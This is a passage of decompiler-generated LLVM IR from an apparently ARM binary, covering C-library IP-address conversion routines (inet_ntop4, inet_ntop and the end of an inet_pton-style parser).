  %v5_1c914 = add i32 %v4_1c914, 1
  store i32 %v5_1c914, i32* %r3.global-to-local, align 4
  %v0_1c918 = load i32, i32* @r7, align 4
  %v1_1c918 = trunc i32 %v0_1c918 to i8
  %v2_1c918 = load i32, i32* @r6, align 4
  %v3_1c918 = add i32 %v2_1c918, 1
  %v4_1c918 = inttoptr i32 %v3_1c918 to i8*
  store i8 %v1_1c918, i8* %v4_1c918, align 1
  %v0_1c91c = load i32, i32* %r3.global-to-local, align 4
  %v1_1c91c = add i32 %v0_1c91c, 1
  store i32 %v1_1c91c, i32* @r4, align 4
  br label %dec_label_pc_1c920

dec_label_pc_1c920:                               ; preds = %dec_label_pc_1c8cc.dec_label_pc_1c920_crit_edge, %dec_label_pc_1c8f4.thread, %dec_label_pc_1c8f4, %dec_label_pc_1c90c
  %v0_1c964.pre = phi i32 [ %v0_1c964.pre.pre, %dec_label_pc_1c8cc.dec_label_pc_1c920_crit_edge ], [ %v3_1c7ec, %dec_label_pc_1c8f4.thread ], [ %v0_1c8f8.pre, %dec_label_pc_1c8f4 ], [ %v1_1c91c, %dec_label_pc_1c90c ]
  %v0_1c920 = load i32, i32* %fp.global-to-local, align 4
  %v2_1c920 = icmp eq i32 %v0_1c920, 0
  %v1_1c964.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_1c920, label %dec_label_pc_1c964, label %dec_label_pc_1c928

dec_label_pc_1c928:                               ; preds = %dec_label_pc_1c920
  %v9_1c928 = icmp eq i32 %v0_1c964.pre, %v1_1c964.pre
  %v2_1c92c = sub i32 %v0_1c964.pre, %v0_1c920
  store i32 %v2_1c92c, i32* @ip, align 4
  br i1 %v9_1c928, label %dec_label_pc_1c984, label %dec_label_pc_1c94c.preheader

dec_label_pc_1c94c.preheader:                     ; preds = %dec_label_pc_1c928
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_1c94c

dec_label_pc_1c940:                               ; preds = %dec_label_pc_1c94c
  %v2_1c954 = sub i32 %v0_1c960, %v0_1c958
  %v0_1c940 = load i32, i32* %fp.global-to-local, align 4
  %v2_1c940 = add i32 %v0_1c940, %v2_1c950
  %v3_1c940 = inttoptr i32 %v2_1c940 to i8*
  %v4_1c940 = load i8, i8* %v3_1c940, align 1
  %v6_1c940 = zext i8 %v4_1c940 to i32
  store i32 %v6_1c940, i32* %r3.global-to-local, align 4
  %v3_1c944 = inttoptr i32 %v2_1c954 to i8*
  store i8 %v4_1c940, i8* %v3_1c944, align 1
  %v0_1c948 = load i32, i32* @lr, align 4
  %v1_1c948 = trunc i32 %v0_1c948 to i8
  %v2_1c948 = load i32, i32* %fp.global-to-local, align 4
  %v3_1c948 = load i32, i32* %r1.global-to-local, align 4
  %v4_1c948 = add i32 %v3_1c948, %v2_1c948
  %v5_1c948 = inttoptr i32 %v4_1c948 to i8*
  store i8 %v1_1c948, i8* %v5_1c948, align 1
  %v0_1c94c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1c94c.pre = load i32, i32* @ip, align 4
  %v1_1c954.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1c94c

dec_label_pc_1c94c:                               ; preds = %dec_label_pc_1c94c.preheader, %dec_label_pc_1c940
  %v0_1c960 = phi i32 [ %v1_1c964.pre, %dec_label_pc_1c94c.preheader ], [ %v1_1c954.pre, %dec_label_pc_1c940 ]
  %v1_1c950 = phi i32 [ %v2_1c92c, %dec_label_pc_1c94c.preheader ], [ %v1_1c94c.pre, %dec_label_pc_1c940 ]
  %v0_1c958 = phi i32 [ 1, %dec_label_pc_1c94c.preheader ], [ %v0_1c94c.pre, %dec_label_pc_1c940 ]
  %v9_1c94c = inttoptr i32 %v0_1c958 to i8*
  %v10_1c94c = inttoptr i32 %v1_1c950 to i8*
  %v2_1c950 = sub i32 %v1_1c950, %v0_1c958
  store i32 %v2_1c950, i32* %r1.global-to-local, align 4
  %v1_1c958 = add i32 %v0_1c958, 1
  store i32 %v1_1c958, i32* %r2.global-to-local, align 4
  %v9_1c95c = icmp sgt i8* %v9_1c94c, %v10_1c94c
  br i1 %v9_1c95c, label %dec_label_pc_1c960, label %dec_label_pc_1c940

dec_label_pc_1c960:                               ; preds = %dec_label_pc_1c94c
  store i32 %v0_1c960, i32* @r4, align 4
  br label %dec_label_pc_1c964

dec_label_pc_1c964:                               ; preds = %dec_label_pc_1c920, %dec_label_pc_1c960
  %v0_1c964 = phi i32 [ %v0_1c960, %dec_label_pc_1c960 ], [ %v0_1c964.pre, %dec_label_pc_1c920 ]
  %v1_1c964 = phi i32 [ %v0_1c960, %dec_label_pc_1c960 ], [ %v1_1c964.pre, %dec_label_pc_1c920 ]
  %v9_1c964 = icmp eq i32 %v0_1c964, %v1_1c964
  br i1 %v9_1c964, label %dec_label_pc_1c96c, label %dec_label_pc_1c984

dec_label_pc_1c96c:                               ; preds = %dec_label_pc_1c964
  %v2_1c96c = load i32, i32* %stack_var_-56, align 4
  store i32 %v2_1c96c, i32* @r0, align 4
  store i32 %v2_1c7e0, i32* @r1, align 4
  store i32 16, i32* @r2, align 4
  %v0_1c978 = call i32 @memcpy()
  br label %dec_label_pc_1c99c

dec_label_pc_1c984:                               ; preds = %dec_label_pc_1c83c, %dec_label_pc_1c868, %dec_label_pc_1c888, %dec_label_pc_1c87c, %dec_label_pc_1c928, %dec_label_pc_1c8cc, %dec_label_pc_1c8b8, %dec_label_pc_1c964, %dec_label_pc_1c804, %dec_label_pc_1c900, %dec_label_pc_1c8c0
  br label %dec_label_pc_1c99c

dec_label_pc_1c98c:                               ; preds = %dec_label_pc_1c7c4
  %v0_1c98c = call i32 @__GI___errno_location()
  store i32 97, i32* %r3.global-to-local, align 4
  %v2_1c994 = inttoptr i32 %v0_1c98c to i32*
  store i32 97, i32* %v2_1c994, align 4
  br label %dec_label_pc_1c99c

dec_label_pc_1c99c:                               ; preds = %dec_label_pc_1c984, %dec_label_pc_1c96c, %dec_label_pc_1c7d0, %dec_label_pc_1c98c
  %v29_1c9a0 = phi i32 [ 0, %dec_label_pc_1c984 ], [ 1, %dec_label_pc_1c96c ], [ %v3_1c7d8, %dec_label_pc_1c7d0 ], [ -1, %dec_label_pc_1c98c ]
  store i32 %v3_1c7ac, i32* @r4, align 4
  store i32 %v6_1c7ac, i32* @r5, align 4
  store i32 %v9_1c7ac, i32* @r6, align 4
  store i32 %v12_1c7ac, i32* @r7, align 4
  ret i32 %v29_1c9a0

; uselistorder directives
  uselistorder i32 %v2_1c950, { 1, 0 }
  uselistorder i32 %v0_1c958, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1c960, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1c964.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1c964.pre, { 2, 0, 1 }
  uselistorder i32 %v3_1c910, { 1, 0 }
  uselistorder i32 %v0_1c8f8.pre, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v3_1c8e8, { 1, 0 }
  uselistorder i32 %v0_1c8c0, { 1, 0, 2 }
  uselistorder i32 %v3_1c894, { 1, 0 }
  uselistorder i32 %v0_1c888, { 1, 0, 2 }
  uselistorder i32 %v1_1c834, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_1c814, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 0, 4, 1, 2, 3, 5 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 5, 6, 4, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 ptrtoint ([17 x i8]* @global_var_25734.1707 to i32), { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1c99c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1c984, { 7, 4, 9, 5, 10, 6, 2, 3, 1, 0, 8 }
  uselistorder label %dec_label_pc_1c964, { 1, 0 }
  uselistorder label %dec_label_pc_1c94c, { 1, 0 }
  uselistorder label %dec_label_pc_1c920, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1c8e8.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1c824, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-53 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1c9ac = load i32, i32* @r4, align 4
  store i32 %v3_1c9ac, i32* %stack_var_-36, align 4
  %v28_1c9ac = ptrtoint i32* %stack_var_-36 to i32
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 %arg3, i32* %stack_var_-64, align 4
  store i32 0, i32* %stack_var_-53, align 4
  %v2_1ca64 = add i32 %v28_1c9ac, -17
  br label %dec_label_pc_1ca84

dec_label_pc_1c9d4:                               ; preds = %dec_label_pc_1ca84
  %v0_1c9d4 = load i32, i32* %fp.global-to-local, align 4
  %v2_1c9d4 = add i32 %v0_1c9d4, %v1_1c9d4
  %v3_1c9d4 = inttoptr i32 %v2_1c9d4 to i8*
  %v4_1c9d4 = load i8, i8* %v3_1c9d4, align 1
  %v6_1c9d4 = zext i8 %v4_1c9d4 to i32
  store i32 %v6_1c9d4, i32* %r4.global-to-local, align 4
  %div = udiv i8 %v4_1c9d4, 100
  %v1_1c9e0 = or i8 %div, 48
  %v3_1c9e4 = add i32 %v2_1ca94, -17
  %v4_1c9e4 = inttoptr i32 %v3_1c9e4 to i8*
  store i8 %v1_1c9e0, i8* %v4_1c9e4, align 1
  %v0_1c9e8 = load i32, i32* %r5.global-to-local, align 4
  %v1_1c9e8 = add i32 %v0_1c9e8, -17
  %v2_1c9e8 = inttoptr i32 %v1_1c9e8 to i8*
  %v3_1c9e8 = load i8, i8* %v2_1c9e8, align 1
  %v0_1c9ec = load i32, i32* %r6.global-to-local, align 4
  %v1_1c9ec = add i32 %v0_1c9ec, 1
  store i32 %v1_1c9ec, i32* %r6.global-to-local, align 4
  store i32 %v28_1c9ac, i32* %r2.global-to-local, align 4
  %v7_1c9f4 = icmp eq i8 %v3_1c9e8, 48
  %v0_1c9fc = load i32, i32* %r4.global-to-local, align 4
  %v0_1ca04 = load i32, i32* %fp.global-to-local, align 4
  %v1_1ca04 = load i32, i32* %sl.global-to-local, align 4
  %v2_1ca04 = add i32 %v1_1ca04, %v0_1ca04
  store i32 %v2_1ca04, i32* %sb.global-to-local, align 4
  %v2_1ca0c = udiv i32 %v0_1c9fc, 10
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_1ca14 = urem i32 %v2_1ca0c, 256
  %v2_1ca18 = urem i32 %v1_1ca14, 10
  %v1_1ca1c = or i32 %v2_1ca18, 48
  br i1 %v7_1c9f4, label %dec_label_pc_1ca0c, label %dec_label_pc_1ca34

dec_label_pc_1ca0c:                               ; preds = %dec_label_pc_1c9d4
  %v7_1ca24 = icmp eq i32 %v1_1ca1c, 48
  br i1 %v7_1ca24, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_1ca0c
  store i32 %v1_1c9ec, i32* %r7.global-to-local, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_1ca0c, %bb
  %v1_1ca2c = trunc i32 %v1_1ca1c to i8
  store i8 %v1_1ca2c, i8* %v2_1c9e8, align 1
  %v0_1ca60.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1ca50

dec_label_pc_1ca34:                               ; preds = %dec_label_pc_1c9d4
  %v2_1ca00 = add i32 %v1_1c9ec, %v28_1c9ac
  %v1_1ca48 = trunc i32 %v1_1ca1c to i8
  %v3_1ca48 = add i32 %v2_1ca00, -17
  %v4_1ca48 = inttoptr i32 %v3_1ca48 to i8*
  store i8 %v1_1ca48, i8* %v4_1ca48, align 1
  %v0_1ca4c = load i32, i32* %r6.global-to-local, align 4
  %v1_1ca4c = add i32 %v0_1ca4c, 1
  store i32 %v1_1ca4c, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1ca50

dec_label_pc_1ca50:                               ; preds = %bb16, %dec_label_pc_1ca34
  %v0_1ca60 = phi i32 [ %v0_1ca60.pre, %bb16 ], [ %v1_1ca4c, %dec_label_pc_1ca34 ]
  %v0_1ca50 = load i32, i32* %sb.global-to-local, align 4
  %v1_1ca50 = inttoptr i32 %v0_1ca50 to i8*
  %v2_1ca50 = load i8, i8* %v1_1ca50, align 1
  %tmp17 = urem i8 %v2_1ca50, 10
  store i32 %v28_1c9ac, i32* %ip.global-to-local, align 4
  %v1_1ca60 = add i32 %v0_1ca60, 1
  store i32 %v1_1ca60, i32* %r1.global-to-local, align 4
  %v1_1ca68 = or i8 %tmp17, 48
  %v3_1ca6c = add i32 %v2_1ca64, %v0_1ca60
  %v4_1ca6c = inttoptr i32 %v3_1ca6c to i8*
  store i8 %v1_1ca68, i8* %v4_1ca6c, align 1
  %v0_1ca70 = load i32, i32* %ip.global-to-local, align 4
  %v1_1ca70 = load i32, i32* %r1.global-to-local, align 4
  %v2_1ca70 = add i32 %v1_1ca70, %v0_1ca70
  store i32 %v2_1ca70, i32* %r2.global-to-local, align 4
  %v3_1ca78 = add i32 %v2_1ca70, -17
  %v4_1ca78 = inttoptr i32 %v3_1ca78 to i8*
  store i8 46, i8* %v4_1ca78, align 1
  %v0_1ca7c = load i32, i32* %r1.global-to-local, align 4
  %v1_1ca7c = add i32 %v0_1ca7c, 1
  store i32 %v1_1ca7c, i32* %r6.global-to-local, align 4
  %v0_1ca80 = load i32, i32* %sl.global-to-local, align 4
  %v1_1ca80 = add i32 %v0_1ca80, 1
  store i32 %v1_1ca80, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1ca84

dec_label_pc_1ca84:                               ; preds = %entry, %dec_label_pc_1ca50
  %v0_1ca90 = phi i32 [ 0, %entry ], [ %v1_1ca7c, %dec_label_pc_1ca50 ]
  %v1_1c9d4 = phi i32 [ 0, %entry ], [ %v1_1ca80, %dec_label_pc_1ca50 ]
  store i32 %v28_1c9ac, i32* %ip.global-to-local, align 4
  store i32 100, i32* %r1.global-to-local, align 4
  store i32 %v0_1ca90, i32* %r7.global-to-local, align 4
  %v2_1ca94 = add i32 %v0_1ca90, %v28_1c9ac
  store i32 %v2_1ca94, i32* %r5.global-to-local, align 4
  %v7_1ca98 = icmp sgt i32 %v1_1c9d4, 3
  br i1 %v7_1ca98, label %dec_label_pc_1ca9c, label %dec_label_pc_1c9d4

dec_label_pc_1ca9c:                               ; preds = %dec_label_pc_1ca84
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_1caa0 = ptrtoint i32* %stack_var_-53 to i32
  store i32 %v2_1caa0, i32* %r4.global-to-local, align 4
  %v3_1caa4 = add i32 %v2_1ca94, -18
  %v4_1caa4 = inttoptr i32 %v3_1caa4 to i8*
  store i8 0, i8* %v4_1caa4, align 1
  %tmp18 = bitcast i32* %stack_var_-53 to i8*
  %v3_1caac = call i32 @strlen(i8* %tmp18)
  %v2_1cab0 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_1cab0, i32* %r2.global-to-local, align 4
  %tmp = icmp ugt i32 %v3_1caac, %v2_1cab0
  br i1 %tmp, label %dec_label_pc_1cabc, label %dec_label_pc_1cad0

dec_label_pc_1cabc:                               ; preds = %dec_label_pc_1ca9c
  %v0_1cabc = call i32 @__GI___errno_location()
  %v0_1cac4 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1cac4, i32* %r2.global-to-local, align 4
  %v2_1cac8 = inttoptr i32 %v0_1cabc to i32*
  store i32 28, i32* %v2_1cac8, align 4
  %v0_1cae0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1cae0

dec_label_pc_1cad0:                               ; preds = %dec_label_pc_1ca9c
  store i32 %v2_1caa0, i32* @r1, align 4
  %v2_1cad8 = inttoptr i32 %arg2 to i8*
  %v3_1cad8 = call i32 @strcpy(i8* %v2_1cad8, i32 %v2_1caa0)
  store i32 %v3_1cad8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1cae0

dec_label_pc_1cae0:                               ; preds = %dec_label_pc_1cabc, %dec_label_pc_1cad0
  %v0_1cae0 = phi i32 [ %v0_1cae0.pre, %dec_label_pc_1cabc ], [ %v3_1cad8, %dec_label_pc_1cad0 ]
  %v2_1cae8 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_1cae8, i32* @r4, align 4
  ret i32 %v0_1cae0

; uselistorder directives
  uselistorder i32 %v2_1caa0, { 1, 0, 2 }
  uselistorder i32 %v2_1ca94, { 0, 2, 1 }
  uselistorder i32 %v1_1c9d4, { 1, 0 }
  uselistorder i32 %v1_1ca1c, { 1, 0, 2 }
  uselistorder i32 %v28_1c9ac, { 0, 5, 3, 2, 4, 1 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i32* %stack_var_-53, { 0, 2, 1 }
  uselistorder i32* %r7.global-to-local, { 3, 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32* %ip.global-to-local, { 2, 0, 1 }
  uselistorder i8 48, { 0, 6, 1, 4, 7, 8, 9, 10, 11, 2, 3, 12, 5 }
  uselistorder i32 -17, { 2, 3, 4, 5, 0, 6, 1 }
  uselistorder label %dec_label_pc_1cae0, { 1, 0 }
  uselistorder label %dec_label_pc_1ca84, { 1, 0 }
  uselistorder label %dec_label_pc_1ca50, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-114 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1caec = load i32, i32* @r4, align 4
  store i32 %v3_1caec, i32* %stack_var_-36, align 4
  %v6_1caec = load i32, i32* @r5, align 4
  %v28_1caec = ptrtoint i32* %stack_var_-36 to i32
  %v7_1caf0 = icmp eq i32 %arg1, 2
  store i1 %v7_1caf0, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg4, i32* %stack_var_-124, align 4
  br i1 %v7_1caf0, label %dec_label_pc_1cb14, label %dec_label_pc_1cb08

dec_label_pc_1cb08:                               ; preds = %entry
  %v7_1cb08 = icmp eq i32 %arg1, 10
  store i1 %v7_1cb08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1cb08, label %dec_label_pc_1cb28, label %dec_label_pc_1cd34

dec_label_pc_1cb14:                               ; preds = %entry
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r2.global-to-local, align 4
  %v3_1cb20 = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_1cd2c

dec_label_pc_1cb28:                               ; preds = %dec_label_pc_1cb08
  %v2_1cb28 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_1cb28, i32* %r0.global-to-local, align 4
  store i32 32, i32* @r2, align 4
  %v2_1cb34 = bitcast i32* %stack_var_-68 to i8*
  %v3_1cb34 = call i32 @__GI_memset(i8* %v2_1cb34, i32 0)
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1cb3c

dec_label_pc_1cb3c:                               ; preds = %dec_label_pc_1cb3c.dec_label_pc_1cb3c_crit_edge, %dec_label_pc_1cb28
  %v0_1cb54 = phi i32 [ %v0_1cb3c.pre, %dec_label_pc_1cb3c.dec_label_pc_1cb3c_crit_edge ], [ 0, %dec_label_pc_1cb28 ]
  %v1_1cb3c = load i32, i32* @r8, align 4
  %v2_1cb3c = add i32 %v1_1cb3c, %v0_1cb54
  %v3_1cb40 = inttoptr i32 %v2_1cb3c to i8*
  %v4_1cb40 = load i8, i8* %v3_1cb40, align 1
  %v6_1cb40 = zext i8 %v4_1cb40 to i32
  %v1_1cb44 = add i32 %v2_1cb3c, 1
  %v2_1cb44 = inttoptr i32 %v1_1cb44 to i8*
  %v3_1cb44 = load i8, i8* %v2_1cb44, align 1
  %v4_1cb44 = zext i8 %v3_1cb44 to i32
  %tmp72 = icmp slt i32 %v0_1cb54, 0
  %v4_1cb48 = zext i1 %tmp72 to i32
  %v5_1cb48 = add i32 %v4_1cb48, %v0_1cb54
  %v4_1cb4c = mul nuw nsw i32 %v6_1cb40, 256
  %v5_1cb4c = or i32 %v4_1cb44, %v4_1cb4c
  store i32 %v5_1cb4c, i32* %r2.global-to-local, align 4
  %v3_1cb50 = sdiv i32 %v5_1cb48, 2
  %v1_1cb54 = add i32 %v0_1cb54, 2
  store i32 %v1_1cb54, i32* %r0.global-to-local, align 4
  %v4_1cb5c = mul i32 %v3_1cb50, 4
  %v5_1cb5c = add i32 %v4_1cb5c, %v28_1caec
  %v7_1cb60 = icmp eq i32 %v1_1cb54, 15
  store i1 %v7_1cb60, i1* %cpsr_z.global-to-local, align 1
  %v2_1cb64 = add i32 %v5_1cb5c, -32
  %v3_1cb64 = inttoptr i32 %v2_1cb64 to i32*
  store i32 %v5_1cb4c, i32* %v3_1cb64, align 4
  %v7_1cb68 = icmp sgt i32 %v1_1cb54, 15
  br i1 %v7_1cb68, label %dec_label_pc_1cb6c, label %dec_label_pc_1cb3c.dec_label_pc_1cb3c_crit_edge

dec_label_pc_1cb3c.dec_label_pc_1cb3c_crit_edge:  ; preds = %dec_label_pc_1cb3c
  %v0_1cb3c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1cb3c

dec_label_pc_1cb6c:                               ; preds = %dec_label_pc_1cb3c
  store i32 -1, i32* @r6, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1cb84

dec_label_pc_1cb84:                               ; preds = %dec_label_pc_1cb6c, %dec_label_pc_1cbd0
  %v0_1cbc4 = phi i32 [ -1, %dec_label_pc_1cb6c ], [ %v0_1cbf8, %dec_label_pc_1cbd0 ]
  %v0_1cbb4 = phi i32 [ -1, %dec_label_pc_1cb6c ], [ %v0_1cbe4, %dec_label_pc_1cbd0 ]
  %v0_1cb98 = phi i32 [ -1, %dec_label_pc_1cb6c ], [ %v0_1cb987, %dec_label_pc_1cbd0 ]
  %v0_1cbd0 = phi i32 [ 0, %dec_label_pc_1cb6c ], [ %v1_1cbd0, %dec_label_pc_1cbd0 ]
  store i32 %v28_1caec, i32* @lr, align 4
  %v4_1cb88 = mul nuw nsw i32 %v0_1cbd0, 4
  %v5_1cb88 = add i32 %v4_1cb88, %v28_1caec
  %v1_1cb8c = add i32 %v5_1cb88, -32
  %v2_1cb8c = inttoptr i32 %v1_1cb8c to i32*
  %v3_1cb8c = load i32, i32* %v2_1cb8c, align 4
  %v2_1cb90 = icmp eq i32 %v3_1cb8c, 0
  %v7_1cb98 = icmp eq i32 %v0_1cb98, -1
  br i1 %v2_1cb90, label %dec_label_pc_1cb98, label %dec_label_pc_1cbac

dec_label_pc_1cb98:                               ; preds = %dec_label_pc_1cb84
  br i1 %v7_1cb98, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1cb98
  store i32 %v0_1cbd0, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_1cbd0

.thread:                                          ; preds = %dec_label_pc_1cb98
  %v1_1cba4.pre = load i32, i32* @r4, align 4
  %v2_1cba4 = add i32 %v1_1cba4.pre, 1
  store i32 %v2_1cba4, i32* @r4, align 4
  br label %dec_label_pc_1cbd0

dec_label_pc_1cbac:                               ; preds = %dec_label_pc_1cb84
  br i1 %v7_1cb98, label %dec_label_pc_1cbd0, label %dec_label_pc_1cbb4

dec_label_pc_1cbb4:                               ; preds = %dec_label_pc_1cbac
  %v7_1cbb4 = icmp eq i32 %v0_1cbb4, -1
  %v0_1cbc8.pre = load i32, i32* @r4, align 4
  %v1_1cbbc = load i32, i32* @r7, align 4
  %v7_1cbc0 = icmp sgt i32 %v0_1cbc8.pre, %v1_1cbbc
  %or.cond = or i1 %v7_1cbb4, %v7_1cbc0
  br i1 %or.cond, label %dec_label_pc_1cbc4, label %dec_label_pc_1cbcc

dec_label_pc_1cbc4:                               ; preds = %dec_label_pc_1cbb4
  store i32 %v0_1cbc4, i32* @r6, align 4
  store i32 %v0_1cbc8.pre, i32* @r7, align 4
  br label %dec_label_pc_1cbcc

dec_label_pc_1cbcc:                               ; preds = %dec_label_pc_1cbb4, %dec_label_pc_1cbc4
  %v0_1cbb412 = phi i32 [ %v0_1cbc4, %dec_label_pc_1cbc4 ], [ %v0_1cbb4, %dec_label_pc_1cbb4 ]
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1cbd0

dec_label_pc_1cbd0:                               ; preds = %bb, %.thread, %dec_label_pc_1cbac, %dec_label_pc_1cbcc
  %v0_1cbf8 = phi i32 [ %v0_1cbc4, %.thread ], [ %v0_1cbd0, %bb ], [ %v0_1cbc4, %dec_label_pc_1cbac ], [ -1, %dec_label_pc_1cbcc ]
  %v0_1cb987 = phi i32 [ %v0_1cb98, %.thread ], [ %v0_1cbd0, %bb ], [ -1, %dec_label_pc_1cbac ], [ -1, %dec_label_pc_1cbcc ]
  %v0_1cbe4 = phi i32 [ %v0_1cbb4, %.thread ], [ %v0_1cbb4, %bb ], [ %v0_1cbb4, %dec_label_pc_1cbac ], [ %v0_1cbb412, %dec_label_pc_1cbcc ]
  %v1_1cbd0 = add nuw nsw i32 %v0_1cbd0, 1
  %v7_1cbd8 = icmp slt i32 %v1_1cbd0, 8
  br i1 %v7_1cbd8, label %dec_label_pc_1cb84, label %dec_label_pc_1cbdc

dec_label_pc_1cbdc:                               ; preds = %dec_label_pc_1cbd0
  %v7_1cbdc = icmp eq i32 %v0_1cbf8, -1
  store i1 %v7_1cbdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1cbdc, label %dec_label_pc_1cbdc.dec_label_pc_1cbfc_crit_edge, label %dec_label_pc_1cbe4

dec_label_pc_1cbdc.dec_label_pc_1cbfc_crit_edge:  ; preds = %dec_label_pc_1cbdc
  %v1_1cc1c.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1cbfc

dec_label_pc_1cbe4:                               ; preds = %dec_label_pc_1cbdc
  %v7_1cbe4 = icmp eq i32 %v0_1cbe4, -1
  store i1 %v7_1cbe4, i1* %cpsr_z.global-to-local, align 1
  %v0_1cbf4.pre = load i32, i32* @r4, align 4
  br i1 %v7_1cbe4, label %dec_label_pc_1cbf4, label %dec_label_pc_1cbec

dec_label_pc_1cbec:                               ; preds = %dec_label_pc_1cbe4
  %v1_1cbec = load i32, i32* @r7, align 4
  %v9_1cbec = icmp eq i32 %v0_1cbf4.pre, %v1_1cbec
  store i1 %v9_1cbec, i1* %cpsr_z.global-to-local, align 1
  %v7_1cbf0 = icmp sgt i32 %v0_1cbf4.pre, %v1_1cbec
  br i1 %v7_1cbf0, label %dec_label_pc_1cbf4, label %dec_label_pc_1cbfc

dec_label_pc_1cbf4:                               ; preds = %dec_label_pc_1cbe4, %dec_label_pc_1cbec
  store i32 %v0_1cbf4.pre, i32* @r7, align 4
  store i32 %v0_1cbf8, i32* @r6, align 4
  br label %dec_label_pc_1cbfc

dec_label_pc_1cbfc:                               ; preds = %dec_label_pc_1cbdc.dec_label_pc_1cbfc_crit_edge, %dec_label_pc_1cbec, %dec_label_pc_1cbf4
  %v1_1cc1c.pre = phi i32 [ %v1_1cbec, %dec_label_pc_1cbec ], [ %v1_1cc1c.pre.pre, %dec_label_pc_1cbdc.dec_label_pc_1cbfc_crit_edge ], [ %v0_1cbf4.pre, %dec_label_pc_1cbf4 ]
  %v0_1cbfc = phi i32 [ %v0_1cbe4, %dec_label_pc_1cbec ], [ %v0_1cbe4, %dec_label_pc_1cbdc.dec_label_pc_1cbfc_crit_edge ], [ %v0_1cbf8, %dec_label_pc_1cbf4 ]
  %v7_1cbfc = icmp eq i32 %v0_1cbfc, -1
  store i1 %v7_1cbfc, i1* %cpsr_z.global-to-local, align 1
